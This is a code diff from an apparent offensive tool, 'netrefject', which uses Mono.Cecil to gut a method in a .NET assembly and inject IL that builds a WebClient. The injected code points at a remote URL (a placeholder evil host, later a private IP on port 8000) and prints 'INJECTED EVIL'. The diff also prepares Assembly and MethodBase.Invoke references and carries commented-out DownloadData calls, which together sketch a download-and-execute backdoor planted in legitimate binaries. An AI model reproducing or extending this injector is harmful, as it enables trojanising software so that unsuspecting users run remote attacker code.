@@ -395,11 +395,10 @@ namespace netrefject
             //Remove All code and variables
             m1.Body.Instructions.Clear();
             m1.Body.Variables.Clear();
+            m1.Body.ExceptionHandlers.Clear();
+
             //Used to just remove the ret but I'm not sure if adding variables will fuck shit up so im clear everything now
             //ilp.Remove(m1.Body.Instructions[m1.Body.Instructions.Count-1]);
-
-            ilp.Append(ilp.Create (OpCodes.Ldstr, "INJECTED EVIL"));
-            ilp.Append(ilp.Create (OpCodes.Call, m1.Module.ImportReference (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));
 
             // Initialize References
             References refs = new References();
@@ -425,7 +424,14 @@ namespace netrefject
             refs.MethodBase_Invoke = m1.Module.ImportReference(typeof(MethodBase).GetMethod("Invoke", new Type[] { typeof(object), typeof(object[]) }));
 
 
+            m1.Body.InitLocals = true;
+            m1.Body.MaxStackSize = 10;
+
             m1.Body.Variables.Add(new VariableDefinition(m1.Module.ImportReference(typeof(WebClient))));
+            m1.Body.Variables.Add(new VariableDefinition(refs.uint8));
+            m1.Body.Variables.Add(new VariableDefinition(refs.Assembly));
+            m1.Body.Variables.Add(new VariableDefinition(refs.MethodInfo));
+
 
             /* Insert Variables
             m1.Body.Variables.Insert(0, new VariableDefinition(refs.uint8));
@@ -470,10 +476,18 @@ namespace netrefject
             //m1.Module.AssemblyReferences.Add(new AssemblyNameReference("System.Net.WebClient",new Version(2,0)));
 
             ilp.Append(Instruction.Create(OpCodes.Nop));
+            ilp.Append(ilp.Create (OpCodes.Ldstr, "INJECTED EVIL"));
+            ilp.Append(ilp.Create (OpCodes.Call, m1.Module.ImportReference (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));
+            ilp.Append(Instruction.Create(OpCodes.Nop));
             ilp.Append(Instruction.Create(OpCodes.Newobj, m1.Module.ImportReference(typeof(WebClient).GetConstructor(new Type[] { }))));
             ilp.Append(Instruction.Create(OpCodes.Stloc_0));
-            ilp.Append(Instruction.Create(OpCodes.Ldloc_0));
-            ilp.Append(Instruction.Create(OpCodes.Ldstr, "http://MYEVILURL.FOKJU/HELLOWORLD"));
+            //ilp.Append(Instruction.Create(OpCodes.Ldloc_0));
+
+            ilp.Append(Instruction.Create(OpCodes.Ldstr, "http://10.20.29.137:8000/HELLOWORLD"));
+            ilp.Append(ilp.Create (OpCodes.Call, m1.Module.ImportReference (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));
+            //ilp.Append(Instruction.Create(OpCodes.Call, m1.Module.ImportReference(typeof(WebClient).GetMethod("DownloadData", new Type[] { typeof(string) }))));
+            //ilp.Append(Instruction.Create(OpCodes.Stloc_1));
+            //ilp.Append(Instruction.Create(OpCodes.Ldloc_1));
 
 
             ilp.Append(Instruction.Create(OpCodes.Nop));
